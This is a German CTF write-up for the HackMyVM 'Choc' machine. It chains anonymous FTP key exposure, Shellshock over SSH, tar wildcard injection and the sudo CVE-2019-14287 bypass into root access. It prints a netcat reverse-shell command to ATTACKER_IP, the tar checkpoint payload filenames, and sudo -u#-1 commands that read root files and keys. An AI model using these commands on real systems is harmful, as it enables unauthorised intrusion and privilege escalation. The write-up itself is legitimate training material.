# Choc - HackMyVM (Hard)

![Choc.png](Choc.png)

## Übersicht

*   **VM:** Choc
*   **Plattform:** [https://hackmyvm.eu/machines/machine.php?vm=Choc](https://hackmyvm.eu/machines/machine.php?vm=Choc)
*   **Schwierigkeit:** Hard
*   **Autor der VM:** DarkSpirit
*   **Datum des Writeups:** 07. Oktober 2022
*   **Original-Writeup:** [https://alientec1908.github.io/Choc_HackMyVM_Hard/](https://alientec1908.github.io/Choc_HackMyVM_Hard/)
*   **Autor:** Ben C.

## Kurzbeschreibung

Die Challenge "Choc" auf HackMyVM (Schwierigkeit: Hard) ist eine komplexe Maschine, die mehrere Eskalationsschritte erfordert. Der Weg zum Root-Zugriff beinhaltet die Ausnutzung eines falsch konfigurierten FTP-Servers, einer Shellshock-Schwachstelle, einer Tar Wildcard Injection durch einen unsicheren Cronjob und schließlich die Ausnutzung einer `sudo` UID -1 Bypass-Schwachstelle (CVE-2019-14287). Jeder Schritt erfordert sorgfältige Enumeration und das Verknüpfen verschiedener Hinweise.

## Disclaimer / Wichtiger Hinweis

Die in diesem Writeup beschriebenen Techniken und Werkzeuge dienen ausschließlich zu Bildungszwecken im Rahmen von legalen Capture-The-Flag (CTF)-Wettbewerben und Penetrationstests auf Systemen, für die eine ausdrückliche Genehmigung vorliegt. Die Anwendung dieser Methoden auf Systeme ohne Erlaubnis ist illegal. Der Autor übernimmt keine Verantwortung für missbräuchliche Verwendung der hier geteilten Informationen. Handeln Sie stets ethisch und verantwortungsbewusst.

## Verwendete Tools

*   `arp-scan`
*   `nmap`
*   `ftp` / `lftp`
*   `ssh`
*   `nc` (Netcat)
*   `find`
*   `tar` (für den Exploit)
*   `scapy` (innerhalb von `sudo` zur Eskalation)
*   `wall` (zur Ausnutzung der `sudo` UID -1 Bypass Schwachstelle)
*   Standard Linux-Befehle (`ls`, `cat`, `echo`, `chmod`, `sudo`, `id`, etc.)

## Lösungsweg (Zusammenfassung)

Der Angriff auf die Maschine "Choc" gliederte sich in folgende Phasen:

1.  **Reconnaissance & Enumeration:**
    *   IP-Findung mittels `arp-scan` (`192.168.2.120`).
    *   `nmap`-Scan identifizierte offene Ports: FTP (21/tcp - vsftpd 3.0.3) und SSH (22/tcp - OpenSSH 7.9p1).
    *   Der FTP-Server erlaubte anonymen Login und enthielt eine global les-/schreibbare `id_rsa`-Datei.

2.  **Initial Access (Shellshock via SSH):**
    *   Die `id_rsa`-Datei wurde vom FTP-Server heruntergeladen. Ein Kommentar im Schlüssel (`carl@choc`) wies auf den Benutzer `carl` hin.
    *   Ein direkter SSH-Login mit dem Schlüssel als `carl` führte zu einem sofortigen Verbindungsabbruch nach dem Anzeigen eines Banners.
    *   Dies deutete auf eine mögliche Shellshock-Anfälligkeit hin.
    *   Ausnutzung von Shellshock (CVE-2014-6271) durch Senden eines präparierten Befehls beim SSH-Login: `ssh carl@choc.hmv -i id_rsa '() { :;}; nc ATTACKER_IP PORT -e /bin/bash'`.
    *   Eine Reverse Shell als Benutzer `carl` wurde erlangt.

3.  **Privilege Escalation (von `carl` zu `torki` via Tar Wildcard Injection):**
    *   Enumeration als `carl` ergab ein Backup-Skript (`/home/torki/backup.sh`) und ein Archiv (`/tmp/backup_home.tgz`), das dem Benutzer `torki` gehörte.
    *   Annahme eines Cronjobs, der `backup.sh` als `torki` ausführt und `tar` unsicher mit Wildcards verwendet.
    *   Erstellung von speziell benannten Dateien (`--checkpoint=1`, `--checkpoint-action=exec=sh pwn.sh`) und einem Payload-Skript (`pwn.sh` für eine Reverse Shell) im Verzeichnis `/home/torki/secret_garden/`.
    *   Nachdem der Cronjob (vermutlich minütlich) lief, wurde `pwn.sh` durch die Tar Wildcard Injection ausgeführt, und eine Reverse Shell als Benutzer `torki` wurde erlangt.

4.  **Privilege Escalation (von `torki` zu `sarah` via sudo/scapy):**
    *   `sudo -l` als `torki` zeigte, dass `/usr/bin/scapy` als Benutzer `sarah` ohne Passwort ausgeführt werden darf.
    *   Innerhalb der `scapy`-Umgebung wurde mit `import pty; pty.spawn("/bin/bash")` eine Shell als `sarah` erlangt.

5.  **Privilege Escalation (von `sarah` zu `root` via sudo UID -1 Bypass):**
    *   Als `sarah` wurde die `sudo` UID -1 Bypass Schwachstelle (CVE-2019-14287) ausgenutzt.
    *   Mit `sudo -u#-1 wall /root/r00t.txt` wurde die Root-Flag (`inesbywal`) ausgelesen.
    *   Mit `sudo -u#-1 wall /root/.ssh/id_rsa` wurde der private SSH-Schlüssel von `root` ausgelesen.
    *   Nach Bereinigung des Schlüssels (Entfernung von Leerzeichen, die `wall` hinzufügt) und Speichern in einer lokalen Datei (`rooter`) erfolgte der SSH-Login als `root` mit diesem Schlüssel.

## Wichtige Schwachstellen und Konzepte

*   **Unsicherer FTP-Server:** Anonymer Zugriff und Ablage eines privaten SSH-Schlüssels mit unsicheren Berechtigungen.
*   **Shellshock (CVE-2014-6271):** Ausgenutzt über SSH, um initialen Zugriff als `carl` zu erhalten.
*   **Tar Wildcard Injection:** Ein unsicherer Cronjob, der `tar` mit Wildcards verwendete, ermöglichte die Ausführung von Code als `torki`.
*   **Unsichere `sudo`-Konfiguration (Scapy):** `torki` konnte `scapy` als `sarah` ausführen, was einen Shell-Escape ermöglichte.
*   **`sudo` UID -1 Bypass (CVE-2019-14287):** `sarah` konnte diese Schwachstelle ausnutzen, um Befehle (wie `wall`) als `root` auszuführen und so sensible Dateien zu lesen.
*   **Kombination von Schwachstellen:** Die Kompromittierung erforderte die Verkettung mehrerer unterschiedlicher Schwachstellen und Eskalationstechniken.

## Flags

*   **User Flag (vermutlich `/home/carl/user.txt` oder `/home/torki/user.txt`):** `pleasefuckme`
*   **Root Flag (`/root/r00t.txt`):** `inesbywal`

## Tags

`HackMyVM`, `Choc`, `Hard`, `FTP Misconfiguration`, `Shellshock`, `Tar Wildcard Injection`, `Sudo Exploitation`, `CVE-2019-14287`, `Privilege Escalation`, `Linux`, `SSH`, `Cronjob`
